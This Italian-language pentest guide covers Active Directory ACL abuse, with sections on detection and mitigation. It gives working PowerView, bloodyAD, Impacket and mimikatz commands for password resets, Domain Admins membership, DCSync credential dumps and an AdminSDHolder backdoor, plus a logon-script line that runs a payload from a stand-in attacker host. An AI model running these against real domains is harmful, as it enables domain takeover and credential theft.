---
title: 'ACL Abuse Active Directory: GenericAll, WriteDACL e DCSync'
slug: acl-abuse
description: 'Guida all’ACL abuse in Active Directory: GenericAll, WriteDACL, reset password, RBCD e DCSync con BloodHound, PowerView, bloodyAD e Impacket.'
image: /acl-abuse-active-directory.webp
draft: true
date: 2026-07-13T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - privilege escalation
  - acl abuse
  - dacl
  - genericall
  - writedacl
---

# ACL Abuse in Active Directory: Permessi, Escalation e DCSync

In Active Directory ogni oggetto ha un Security Descriptor che contiene una DACL — la lista di regole che definisce chi può fare cosa su quell'oggetto. Permessi come [GenericAll](https://hackita.it/articoli/genericall/), [WriteDACL](https://hackita.it/articoli/writedacl/) o [ForceChangePassword](https://hackita.it/articoli/forcechangepassword/) assegnati a utenti sbagliati aprono path di escalation diretti verso Domain Admin — senza exploit, senza vulnerabilità software, solo abusando della configurazione esistente.

***

Gli ACL abuse sono tra i path di escalation più comuni nei pentest su [Active Directory](https://hackita.it/articoli/active-directory/) enterprise. Non richiedono credenziali privilegiate di partenza — bastano permessi eccessivi su oggetti AD, spesso assegnati anni prima per esigenze operative e mai rimossi. [BloodHound](https://hackita.it/articoli/bloodhound/) li visualizza come edge nel grafo: [GenericWrite](https://hackita.it/articoli/genericwrite/), [WriteDACL](https://hackita.it/articoli/writedacl/), [ForceChangePassword](https://hackita.it/articoli/forcechangepassword/), `Owns` — ognuno è un path potenziale verso l'alto.

> **Key Takeaway:** Un singolo permesso eccessivo su un oggetto AD può essere sufficiente per arrivare a Domain Admin. La catena tipica è: permesso su utente/gruppo → reset password o aggiunta a gruppo privilegiato → escalation completa.

Non esiste una singola tecnica MITRE ATT\&CK che copra tutto l'ACL abuse in AD. Le voci più pertinenti sono [T1003.006 (DCSync)](https://attack.mitre.org/techniques/T1003/006/) per il dump via replica e [T1098.007 (Additional Local or Domain Groups)](https://attack.mitre.org/techniques/T1098/007/) per l'aggiunta a gruppi privilegiati. Come data component utile alla detection: **Active Directory Object Modification ([DC0066](https://attack.mitre.org/datacomponents/DC0066/))**.

***

## Fondamenti: Security Descriptor, DACL, SACL e ACE

Prima di abusare un permesso, serve capire cosa lo genera. Ogni oggetto AD ha un **Security Descriptor** composto da:

* **Owner** — chi possiede l'oggetto (può sempre riscrivere la DACL)
* **DACL** (Discretionary ACL) — le regole di accesso: chi può leggere, scrivere, eliminare
* **SACL** (System ACL) — le regole di auditing: quali azioni vengono loggate

La DACL è una lista di **ACE** (Access Control Entry). Ogni ACE è una tripletta: trustee (SID), tipo (Allow/Deny), diritto (es. WriteDACL). Le ACE possono essere esplicite (assegnate direttamente sull'oggetto) o ereditate (arrivano da un container padre, tipo un'[OU](https://hackita.it/articoli/organizational-unit/)).

![Security Descriptor, DACL, SACL](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgNzAwIDM4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjcwMCIgaGVpZ2h0PSIzODAiIGZpbGw9IiNmZmZmZmYiLz4KPHJlY3QgeD0iNDAiIHk9IjIwIiB3aWR0aD0iNjIwIiBoZWlnaHQ9IjUwIiByeD0iNiIgZmlsbD0iIzExMTExMSIvPgo8dGV4dCB4PSIzNTAiIHk9IjUyIiBmb250LWZhbWlseT0ibW9ub3NwYWNlIiBmb250LXNpemU9IjIwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5PZ2dldHRvIEFjdGl2ZSBEaXJlY3Rvcnk8L3RleHQ+Cgo8cmVjdCB4PSI4MCIgeT0iMTAwIiB3aWR0aD0iNTQwIiBoZWlnaHQ9IjI2MCIgcng9IjYiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzExMTExMSIgc3Ryb2tlLXdpZHRoPSIyIi8+Cjx0ZXh0IHg9IjM1MCIgeT0iMTI4IiBmb250LWZhbWlseT0ibW9ub3NwYWNlIiBmb250LXNpemU9IjE2IiBmaWxsPSIjMTExMTExIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5TZWN1cml0eSBEZXNjcmlwdG9yPC90ZXh0PgoKPHJlY3QgeD0iMTEwIiB5PSIxNTAiIHdpZHRoPSIxODAiIGhlaWdodD0iNDAiIHJ4PSI0IiBmaWxsPSIjZGMyNjI2Ii8+Cjx0ZXh0IHg9IjIwMCIgeT0iMTc1IiBmb250LWZhbWlseT0ibW9ub3NwYWNlIiBmb250LXNpemU9IjE0IiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5Pd25lcjwvdGV4dD4KCjxyZWN0IHg9IjExMCIgeT0iMjA1IiB3aWR0aD0iNDgwIiBoZWlnaHQ9IjkwIiByeD0iNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTExMTExIiBzdHJva2Utd2lkdGg9IjIiLz4KPHRleHQgeD0iMTUwIiB5PSIyMjgiIGZvbnQtZmFtaWx5PSJtb25vc3BhY2UiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IiMxMTExMTEiPkRBQ0w8L3RleHQ+CjxyZWN0IHg9IjEzMCIgeT0iMjQwIiB3aWR0aD0iMjAwIiBoZWlnaHQ9IjI0IiBmaWxsPSIjMTExMTExIi8+Cjx0ZXh0IHg9IjIzMCIgeT0iMjU3IiBmb250LWZhbWlseT0ibW9ub3NwYWNlIiBmb250LXNpemU9IjEyIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5BQ0UgQWxsb3cgLSZndDsgU0lEIC0mZ3Q7IFdyaXRlREFDTDwvdGV4dD4KPHJlY3QgeD0iMzUwIiB5PSIyNDAiIHdpZHRoPSIyMjAiIGhlaWdodD0iMjQiIGZpbGw9IiNkYzI2MjYiLz4KPHRleHQgeD0iNDYwIiB5PSIyNTciIGZvbnQtZmFtaWx5PSJtb25vc3BhY2UiIGZvbnQtc2l6ZT0iMTIiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkFDRSBEZW55IC0mZ3Q7IFNJRCAtJmd0OyBXcml0ZVByb3BlcnR5PC90ZXh0PgoKPHJlY3QgeD0iMTEwIiB5PSIzMTAiIHdpZHRoPSI0ODAiIGhlaWdodD0iNDAiIHJ4PSI0IiBmaWxsPSJub25lIiBzdHJva2U9IiMxMTExMTEiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWRhc2hhcnJheT0iNCwzIi8+Cjx0ZXh0IHg9IjM1MCIgeT0iMzM1IiBmb250LWZhbWlseT0ibW9ub3NwYWNlIiBmb250LXNpemU9IjE0IiBmaWxsPSIjMTExMTExIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5TQUNMIC0gcmVnb2xlIGRpIGF1ZGl0aW5nIChFdmVudCBJRCA0NjYyIC8gNTEzNik8L3RleHQ+Cjwvc3ZnPgo=)

Windows valuta le ACE in un ordine preciso: le Deny esplicite vengono prima delle Allow esplicite, e le ACE esplicite vengono prima di quelle ereditate. Questo spiega perché un diritto "teoricamente presente" può non funzionare in pratica — una Deny più specifica può bloccarlo.

***

## Cheat Sheet — Da ACE ad Exploit

| ACE che hai                                                             | Su quale oggetto                                            | Cosa puoi fare                                                                                                                        | Comando rapido                                                  |
| ----------------------------------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| [GenericAll](https://hackita.it/articoli/genericall/)                   | Utente                                                      | Reset pwd, SPN, Shadow Creds                                                                                                          | `Set-DomainUserPassword`                                        |
| [GenericAll](https://hackita.it/articoli/genericall/)                   | Gruppo                                                      | Aggiungiti ([AddMember](https://hackita.it/articoli/addmember/))                                                                      | `Add-DomainGroupMember`                                         |
| [GenericAll](https://hackita.it/articoli/genericall/)                   | Computer                                                    | [RBCD](https://hackita.it/articoli/rbcd/)                                                                                             | `impacket-rbcd -action write`                                   |
| [GenericWrite](https://hackita.it/articoli/genericwrite/)               | Utente                                                      | [WriteSPN](https://hackita.it/articoli/writespn/) → Kerberoast, [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/) | `Set-DomainObject -Set @{serviceprincipalname='x/y'}`           |
| [GenericWrite](https://hackita.it/articoli/genericwrite/)               | Computer                                                    | [WriteAccountRestrictions](https://hackita.it/articoli/writeaccountrestrictions/) → RBCD                                              | `impacket-rbcd -action write`                                   |
| [WriteDACL](https://hackita.it/articoli/writedacl/)                     | Dominio                                                     | Concediti DCSync rights                                                                                                               | `Add-DomainObjectAcl -Rights DCSync`                            |
| [WriteDACL](https://hackita.it/articoli/writedacl/)                     | Qualsiasi                                                   | Concediti GenericAll                                                                                                                  | `Add-DomainObjectAcl -Rights All`                               |
| [WriteOwner](https://hackita.it/articoli/writeowner/)                   | Qualsiasi                                                   | Prendi ownership → WriteDACL                                                                                                          | `Set-DomainObjectOwner`                                         |
| [ForceChangePassword](https://hackita.it/articoli/forcechangepassword/) | Utente                                                      | Reset pwd senza conoscerla                                                                                                            | `Set-DomainUserPassword`                                        |
| `AllExtendedRights`                                                     | Utente                                                      | Reset pwd                                                                                                                             | `Set-DomainUserPassword`                                        |
| [Self / AddSelf](https://hackita.it/articoli/addself/)                  | Gruppo                                                      | Aggiungiti (solo te)                                                                                                                  | `Add-ADGroupMember -Members attacker`                           |
| [GenericAll / WriteDACL](https://hackita.it/articoli/writedacl/)        | OU                                                          | Aggiunta di ACE ereditabili sugli oggetti figli                                                                                       | `dacledit.py -inheritance`                                      |
| [WriteDACL](https://hackita.it/articoli/writedacl/)                     | [AdminSDHolder](https://hackita.it/articoli/adminsdholder/) | Backdoor persistente (SDProp ogni ora)                                                                                                | `Add-DomainObjectAcl -TargetIdentity AdminSDHolder -Rights All` |

***

## Enumerazione: Come Trovare i Permessi Abusabili

```powershell
# PowerView — ACL del tuo account su tutti gli oggetti
$SID = ConvertTo-SID $env:USERNAME
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq $SID -and
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AllExtendedRights"
}
```

```bash
# bloodyAD — trova tutti gli oggetti su cui hai diritti di scrittura effettivi
bloodyAD --host <DC_IP> -d corp.local -u attacker -p 'Password123!' \
  get writable --detail

# bloodyAD — analizza la DACL di un target specifico (risolvendo i SID)
bloodyAD --host <DC_IP> -d corp.local -u attacker -p 'Password123!' \
  get object targetuser --attr nTSecurityDescriptor --resolve-sd
```

Sono due comandi diversi: `get writable` elenca cosa puoi effettivamente scrivere, `get object --attr nTSecurityDescriptor --resolve-sd` mostra la DACL completa di un oggetto specifico.

**Attenzione:** la query PowerView trova solo le ACE assegnate direttamente al tuo SID. Non copre i permessi ottenuti tramite gruppi, gruppi annidati, `Authenticated Users` o `Domain Users`. Un permesso può esistere senza comparire in questa ricerca — [BloodHound](https://hackita.it/articoli/bloodhound/) risolve il problema perché calcola i diritti effettivi attraverso tutta la catena di gruppi. Carica i dati con SharpHound e usa le query predefinite "Shortest Paths to Domain Admins" o "Find Principals with DCSync Rights".

***

## ACE per ACE: Cosa Puoi Fare

### Self / AddSelf su Gruppo

Con l'edge [AddSelf](https://hackita.it/articoli/addself/) puoi aggiungere **solo te stesso** al gruppo target — non altri account.

```powershell
Add-ADGroupMember -Identity 'TargetGroup' -Members attacker
```

```bash
net rpc group addmem "TargetGroup" attacker \
  -U 'corp.local/attacker%Password123!' -S <DC_IP>
```

**Verifica:**

```powershell
Get-DomainGroupMember -Identity 'TargetGroup'
```

***

### AdminSDHolder — Persistenza a Cascata

[AdminSDHolder](https://hackita.it/articoli/adminsdholder/) è un container speciale in AD. Ogni ora circa il processo **SDProp** copia le sue ACL su tutti gli oggetti protetti del dominio — Domain Admins, krbtgt, Administrator e altri. Se hai `WriteDACL` su AdminSDHolder, puoi inserire una backdoor che si auto-propaga a ogni ciclo su tutti gli oggetti privilegiati del dominio.

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' `
  -PrincipalIdentity attacker -Rights All -Verbose

# La propagazione avviene al successivo ciclo SDProp (di norma ogni 60 minuti)
```

Rimuovere il permesso da AdminSDHolder non rimuove automaticamente quelli già propagati sugli oggetti figli — serve pulizia separata su ciascun oggetto interessato.

***

### GenericAll su Utente

Con [GenericAll](https://hackita.it/articoli/genericall/) hai il controllo completo sull'oggetto utente. Puoi resettare la password, aggiungere un SPN per il [targeted Kerberoasting](https://hackita.it/articoli/kerberoasting/) o configurare [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

```powershell
# Reset password senza conoscere quella attuale
$NewPass = ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $NewPass

# Aggiunta SPN per targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
Get-DomainUser targetuser | Get-DomainSPNTicket -OutputFormat Hashcat

# Cleanup — rimuovi SOLO l'SPN aggiunto, mai -Clear
Set-DomainObject -Identity targetuser -Remove @{serviceprincipalname='fake/spn'}
```

`-Clear` cancella l'intero attributo `servicePrincipalName`: se l'account aveva già SPN legittimi li elimini tutti e rischi di interrompere un servizio. Usa sempre `-Remove` con il valore esatto aggiunto, e leggi/salva l'attributo originale prima di modificarlo.

```bash
net rpc password targetuser 'Hacked123!' -U 'corp.local/attacker%Password123!' -S <DC_IP>
```

**Verifica:**

```powershell
Get-DomainUser targetuser -Properties serviceprincipalname
```

***

### GenericWrite su Utente

[GenericWrite](https://hackita.it/articoli/genericwrite/) **non** equivale al controllo completo e non concede automaticamente il reset della password. Permette di modificare attributi scrivibili sfruttabili come `servicePrincipalName` ([WriteSPN](https://hackita.it/articoli/writespn/)), `msDS-KeyCredentialLink` ([Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)) e, quando applicabile, `scriptPath`.

```powershell
# Logon script — esegui codice al prossimo login dell'utente
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\ATTACKER\evil.ps1'}

# SPN → targeted Kerberoasting (stessa tecnica di GenericAll, ma qui il diritto è solo GenericWrite)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
```

***

### GenericAll su Gruppo

Puoi aggiungere qualsiasi account al gruppo — incluso Domain Admins ([AddMember](https://hackita.it/articoli/addmember/), a differenza di AddSelf che limita a te stesso).

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker
Get-DomainGroupMember -Identity 'Domain Admins'
```

```bash
bloodyAD --host <DC_IP> -d corp.local -u attacker -p 'Password123!' \
  add groupMember 'Domain Admins' attacker
```

***

### GenericAll / GenericWrite su Computer → RBCD

Path diretto verso [RBCD](https://hackita.it/articoli/rbcd/) tramite l'edge [WriteAccountRestrictions](https://hackita.it/articoli/writeaccountrestrictions/) — scrivi `msDS-AllowedToActOnBehalfOfOtherIdentity` e impersona Administrator sulla macchina.

**Prerequisito:** serve controllare un principal con proprie chiavi Kerberos — tipicamente un account computer di cui conosci le credenziali o che hai creato tu (es. via MachineAccountQuota). Il solo diritto sul computer target non crea questo principal, va procurato separatamente.

```bash
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGETPC$' \
  -dc-ip <DC_IP> -action write 'corp.local/attacker:Password123!'
```

**Verifica:**

```powershell
Get-ADComputer TARGETPC -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

***

### WriteDACL su Dominio → DCSync

Con [WriteDACL](https://hackita.it/articoli/writedacl/) sull'oggetto dominio puoi concederti i permessi di replica e fare [DCSync](https://hackita.it/articoli/dcsync/). Servono entrambi i diritti estesi `DS-Replication-Get-Changes` e `DS-Replication-Get-Changes-All`.

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' `
  -PrincipalIdentity attacker -Rights DCSync -Verbose

.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"

# Cleanup immediato
Remove-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' `
  -PrincipalIdentity attacker -Rights DCSync
```

```bash
# Backup EFFETTIVO del Security Descriptor prima di modificare — non basta "read"
impacket-dacledit -action backup -file domain-before-dcsync.bak \
  -target-dn 'DC=corp,DC=local' -dc-ip <DC_IP> \
  'corp.local/attacker:Password123!'

# Scrivi il diritto DCSync
python3 dacledit.py -action write -rights DCSync -principal attacker \
  -target-dn 'DC=corp,DC=local' -dc-ip <DC_IP> 'corp.local/attacker:Password123!'

impacket-secretsdump corp.local/attacker:Password123!@<DC_IP> -just-dc-user krbtgt

# Cleanup — ripristina il backup invece di rimuovere manualmente
impacket-dacledit -action restore -file domain-before-dcsync.bak \
  -dc-ip <DC_IP> 'corp.local/attacker:Password123!'
```

***

### WriteDACL su Oggetto → GenericAll

```powershell
Add-DomainObjectAcl -TargetIdentity targetuser `
  -PrincipalIdentity attacker -Rights All
```

```bash
python3 dacledit.py -action write -rights FullControl -principal attacker \
  -target-dn 'CN=targetuser,CN=Users,DC=corp,DC=local' \
  -dc-ip <DC_IP> 'corp.local/attacker:Password123!'
```

***

### WriteOwner → Ownership → WriteDACL → GenericAll

```powershell
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All
```

***

### ForceChangePassword

Reset della password senza conoscere quella attuale. Più diretto ma anche più rumoroso — l'utente se ne accorge al primo tentativo di login fallito.

**Non usare il reset su account reali senza autorizzazione esplicita: la password precedente non è recuperabile se non è conosciuta, e il reset può interrompere servizi, sessioni e processi eseguiti dall'account.**

```powershell
$NewPass = ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $NewPass
```

```bash
bloodyAD --host <DC_IP> -d corp.local -u attacker -p 'Password123!' \
  set password targetuser 'Hacked123!'
```

***

### GenericAll / WriteDACL su OU → Compromissione a Cascata

Controllare un'[OU](https://hackita.it/articoli/organizational-unit/) non è come controllare i singoli oggetti al suo interno: serve un'ACE **ereditabile** che si propaghi ai figli — per aggiungerla serve `WriteDACL` o il controllo completo `GenericAll`; `GenericWrite` da solo non basta perché non tocca la DACL. Con `CreateChild`/`DeleteChild` puoi anche creare o eliminare oggetti nell'OU, e se l'OU ha GPO collegate, [WriteGPLink](https://hackita.it/articoli/writegplink/) o GenericWrite sulla GPO stessa aprono un path alternativo via Group Policy.

```bash
python3 dacledit.py -action write -rights FullControl -inheritance \
  -principal attacker -target-dn 'OU=SERVERS,DC=corp,DC=com' \
  -dc-ip <DC_IP> 'corp.local/attacker:Password123!'
```

***

## Edge Granulari Moderni di BloodHound

BloodHound CE non usa più solo i macro-diritti storici — distingue edge specifici che indicano esattamente cosa puoi fare:

| Edge                                                                              | Significato                                      |
| --------------------------------------------------------------------------------- | ------------------------------------------------ |
| [AddMember](https://hackita.it/articoli/addmember/)                               | Può aggiungere principal arbitrari a un gruppo   |
| [AddSelf](https://hackita.it/articoli/addself/)                                   | Può aggiungere soltanto se stesso                |
| [ForceChangePassword](https://hackita.it/articoli/forcechangepassword/)           | Può resettare la password                        |
| [WriteSPN](https://hackita.it/articoli/writespn/)                                 | Può modificare gli SPN                           |
| [AddKeyCredentialLink](https://hackita.it/articoli/shadow-credentials/)           | Può impostare Shadow Credentials                 |
| [WriteAccountRestrictions](https://hackita.it/articoli/writeaccountrestrictions/) | Può configurare il path RBCD                     |
| [WriteGPLink](https://hackita.it/articoli/writegplink/)                           | Può modificare il collegamento GPO su OU/dominio |
| `GetChanges` + `GetChangesAll`                                                    | Combinati, producono l'edge DCSync               |

Nota: `GetChanges` da solo non basta per DCSync — serve la combinazione con `GetChangesAll`.

***

## Backup, Verifica e Ripristino

Non limitarti a "rimuovere i permessi dopo" — segui una procedura ripetibile che usa un backup reale, non una semplice lettura:

1. Esegui un backup effettivo del Security Descriptor (`impacket-dacledit -action backup -file ...`)
2. Registra il DN esatto, il trustee e il tipo di ACE aggiunta
3. Applica esclusivamente il diritto necessario, mai più del richiesto
4. Verifica l'abuso con un comando di lettura (vedi verifica per tecnica)
5. Ripristina il backup (`-action restore`) invece di rimuovere manualmente l'ACE
6. Controlla che ACE e attributi preesistenti non siano stati alterati

***

## Ambiente di Laboratorio

I comandi vanno sempre verificati contro le versioni realmente installate — sintassi e comportamento di questi tool cambiano tra release.

```text
Windows Server: 2022
Functional level: 2016
Impacket: [versione realmente utilizzata]
bloodyAD: [versione realmente utilizzata]
BloodHound CE: [versione realmente utilizzata]
SharpHound: [versione realmente utilizzata]
PowerView: [repository e commit realmente utilizzati]
```

***

## OPSEC

* **Cleanup obbligatorio:** ogni modifica ACL lascia tracce. Ripristina il backup del Security Descriptor dopo aver ottenuto quello che ti serve
* **WriteDACL → DCSync:** aggiungi i diritti, fai il dump, ripristina il backup immediatamente — il tempo di esposizione deve essere minimo
* **ForceChangePassword:** non utilizzare su account reali senza autorizzazione esplicita — la password precedente non è recuperabile e il reset può interrompere servizi e sessioni attive
* Le modifiche ACL possono essere tracciate quando Advanced Audit Policy e SACL sono configurate correttamente — non dare per scontato che ogni write venga loggato

***

## Scenario Reale

BloodHound mostra che il tuo account ha [WriteDACL](https://hackita.it/articoli/writedacl/) sull'oggetto dominio `DC=corp,DC=local`. Il path verso DCSync è diretto:

1. Esegui un backup effettivo del Security Descriptor con `impacket-dacledit -action backup`
2. Ti concedi `DS-Replication-Get-Changes` e `DS-Replication-Get-Changes-All`
3. Esegui `impacket-secretsdump` e dumpi tutti gli hash del dominio incluso `krbtgt`
4. Ripristini il backup con `-action restore`
5. Con l'hash di `krbtgt` forgi un [Golden Ticket](https://hackita.it/articoli/golden-ticket/) per la persistenza

Il flow non richiede l'appartenenza iniziale a Domain Admins, ma presuppone che l'account controllato disponga già di WriteDACL sull'oggetto dominio — un diritto di per sé estremamente potente, non un privilegio banale da ottenere.

***

## Detection

**🔴 HIGH:**

* **Event ID 5136** — modifica a attributi sensibili come `nTSecurityDescriptor`, `member`, `msDS-AllowedToActOnBehalfOfOtherIdentity`
* **Event ID 4662** — operazione eseguita su un oggetto AD; centrale per individuare richieste di replica (DCSync) da host che non sono Domain Controller
* **Event ID 4670** — modifica ai permessi su oggetti AD
* **Event ID 4728 / 4732 / 4756** — aggiunta membro rispettivamente a gruppo globale, domain-local, universale

**🟡 MEDIUM:**

* Modifica e rimozione rapida di ACL sullo stesso oggetto in breve tempo (pattern di cleanup post-exploit)
* Account non privilegiati che modificano attributi su oggetti sensibili
* Richieste DCSync da account che non sono Domain Controller

**Nota importante:** gli eventi 5136 e 4662 non vengono generati automaticamente. Servono la Advanced Audit Policy configurata correttamente e, per gli oggetti interessati, una SACL adeguata. Attivare solo la raccolta del Security Log non garantisce che tutte le modifiche vengano registrate.

***

## Mitigazione

* Audit periodico degli ACL con [BloodHound](https://hackita.it/articoli/bloodhound/) — rimuovere tutti i permessi non giustificati su oggetti sensibili
* Configurare correttamente Advanced Audit Policy e SACL sugli oggetti ad alto valore, non solo abilitare il Security Log
* Usare [AdminSDHolder](https://hackita.it/articoli/adminsdholder/) correttamente — protegge automaticamente i gruppi privilegiati, ma verificare periodicamente che non contenga ACE indesiderate
* Principio del **least privilege** su service account e deleghe — rivedere periodicamente chi ha WriteDACL o GenericWrite su oggetti di dominio
* Alert su Event ID 4662, 4670 e 5136 per oggetti ad alto valore (Domain Admins, krbtgt, dominio root)

***

## FAQ

**BloodHound mostra un path ACL ma non riesco a sfruttarlo — perché?**
Le cause più comuni: l'ACE è applicata all'oggetto o attributo sbagliato, esiste una Deny ACE più specifica, il diritto è solo ereditabile ma non applicato all'oggetto corrente, AdminSDHolder/SDProp ha sovrascritto i permessi, il token Kerberos non è aggiornato dopo un cambio di gruppo, o la replica tra DC non è ancora completata.

**Devo avere già un account di dominio per sfruttare gli ACL abuse?**
Sì, serve almeno un account autenticato nel dominio per leggere gli ACL e modificarli. L'ACL abuse è una tecnica di escalation, non di accesso iniziale.

**Cleanup delle ACL è sempre possibile?**
Se hai fatto un backup reale del Security Descriptor puoi ripristinarlo. Il problema è la finestra di tempo tra modifica e ripristino — durante la quale i log, se l'auditing è configurato, registrano entrambe le operazioni.

***

## Conclusione

L'ACL abuse è spesso il modo più silenzioso per scalare privilegi in Active Directory — non genera traffico di rete anomalo, non sfrutta vulnerabilità software, e usa le stesse API di amministrazione legittime. Ogni permesso eccessivo su un oggetto AD è un path potenziale verso l'alto.

La difesa richiede visibilità: senza Advanced Audit Policy configurata e alerting su Event ID 4662, 5136 e 4670, questi attacchi passano completamente inosservati. [BloodHound](https://hackita.it/articoli/bloodhound/) è lo strumento migliore sia per l'attacco che per la difesa — chi lo usa prima vince.

***

**Risorse:**

* [MITRE ATT\&CK – T1003.006 DCSync](https://attack.mitre.org/techniques/T1003/006/)
* [MITRE ATT\&CK – T1098.007 Additional Local or Domain Groups](https://attack.mitre.org/techniques/T1098/007/)
* [MITRE ATT\&CK – DC0066 Active Directory Object Modification](https://attack.mitre.org/datacomponents/DC0066/)
* [HackTricks – DACL Abuse](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html)
* [SpecterOps BloodHound – Edge Reference](https://bloodhound.specterops.io/resources/edges/)
